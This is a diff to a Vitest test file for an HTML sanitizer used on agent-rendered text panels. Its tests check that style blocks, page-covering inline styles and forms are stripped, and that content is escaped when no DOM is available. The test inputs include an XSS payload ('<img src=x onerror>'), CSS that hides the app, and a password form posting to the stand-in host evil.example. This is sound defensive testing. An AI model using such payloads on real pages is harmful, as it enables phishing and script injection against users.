@@ -4,7 +4,8 @@
  * The sanitizer at the text-panel seam. jsdom because DOMPurify needs a DOM — and
  * because the fail-closed branch below is what happens when it does not have one.
  */
-import { describe, expect, it } from 'vitest';
+import { afterEach, describe, expect, it } from 'vitest';
+import DOMPurify from 'dompurify';
 import { marked } from 'marked';
 import { toSafePanelHtml } from '../panelHtml';
 // The real agent artifact: its panel 1 is the markdown text panel that every agent
@@ -91,6 +92,100 @@ describe('toSafePanelHtml — html mode', () => {
     const html = toSafePanelHtml('<div class="note"><b>hi</b><a href="/x">link</a></div>', 'html');
     expect(html).toContain('<b>hi</b>');
     expect(html).toContain('href="/x"');
+  });
+});
+
+describe('author markup the default config would have broken', () => {
+  it('keeps target on a link, and forces rel so the opener handle is not shared', () => {
+    const html = toSafePanelHtml('<a href="https://docs.example.com" target="_blank">Runbook</a>', 'html');
+    expect(html).toContain('target="_blank"');
+    expect(html).toContain('rel="noopener noreferrer"');
+  });
+
+  it('treats a tag the same wherever it sits in the string', () => {
+    // The parser hoists a LEADING style/title/meta into <head> and DOMPurify returns
+    // only <body>, so an ALLOWED head-hoistable tag would behave differently depending
+    // on whether text precedes it. Refusing <style> outright is what settles that —
+    // this pins the outcome, so re-allowing the tag fails here rather than shipping
+    // the asymmetry.
+    const leading = toSafePanelHtml('<style>.k{color:red}</style><p class="k">C</p>', 'html');
+    const trailing = toSafePanelHtml('<p class="k">C</p><style>.k{color:red}</style>', 'html');
+    expect(leading).not.toContain('<style');
+    expect(trailing).not.toContain('<style');
+    expect(leading).toContain('<p class="k">C</p>');
+    expect(trailing).toContain('<p class="k">C</p>');
+  });
+
+  it('keeps the class attribute, which is how a panel styles itself now', () => {
+    expect(toSafePanelHtml('<p class="text-lg font-bold">Big</p>', 'html'))
+      .toContain('class="text-lg font-bold"');
+  });
+});
+
+describe('the injection surface script-blocking alone leaves open', () => {
+  it('drops a document-wide style block that could hide the app', () => {
+    const html = toSafePanelHtml('AI summary.\n<style>#root>*{display:none}</style>', 'markdown');
+    expect(html).not.toContain('<style');
+    expect(html).not.toContain('display:none');
+    expect(html).toContain('AI summary.');
+  });
+
+  it('drops an inline style that could cover the page', () => {
+    const html = toSafePanelHtml('<div style="position:fixed;inset:0;z-index:9999">gotcha</div>', 'html');
+    expect(html).not.toContain('style=');
+    expect(html).not.toContain('position:fixed');
+    expect(html).toContain('gotcha');
+  });
+
+  it('drops a credential form pointing at another origin', () => {
+    const html = toSafePanelHtml(
+      '<form action="https://evil.example" method="POST"><input name="pw" type="password"><button>Go</button></form>',
+      'html',
+    );
+    expect(html).not.toContain('<form');
+    expect(html).not.toContain('<input');
+    expect(html).not.toContain('<button');
+    expect(html).not.toContain('evil.example');
+  });
+
+  it('drops the same surfaces when they arrive through markdown', () => {
+    const html = toSafePanelHtml('note\n\n<form action="https://evil.example"><input name="pw"></form>', 'markdown');
+    expect(html).not.toContain('<form');
+    expect(html).not.toContain('<input');
+    expect(html).toContain('note');
+  });
+});
+
+describe('without a DOM, it fails CLOSED', () => {
+  // The docblock cites this branch as the reason the file chose jsdom, and nothing
+  // entered it: returning `rendered` instead of escaping kept every other test green.
+  const original = Object.getOwnPropertyDescriptor(DOMPurify, 'isSupported');
+
+  afterEach(() => {
+    if (original) Object.defineProperty(DOMPurify, 'isSupported', original);
+  });
+
+  const withoutDom = () =>
+    Object.defineProperty(DOMPurify, 'isSupported', { value: false, configurable: true });
+
+  it('escapes the content to text rather than passing HTML through', () => {
+    withoutDom();
+    const html = toSafePanelHtml('<img src=x onerror="alert(1)">', 'markdown');
+
+    expect(html).not.toContain('<img');
+    expect(html).toContain('&lt;img');
+    expect(html).toContain('onerror=&quot;alert(1)&quot;');
+  });
+
+  it('escapes html-mode content the same way', () => {
+    withoutDom();
+    expect(toSafePanelHtml('<b>hi</b>', 'html')).toBe('&lt;b&gt;hi&lt;/b&gt;');
+  });
+
+  it('escapes the RAW content, never the parsed markdown', () => {
+    withoutDom();
+    // Escaping marked's output would leak the parser's own tags as visible text.
+    expect(toSafePanelHtml('# Title', 'markdown')).toBe('# Title');
   });
 });
 
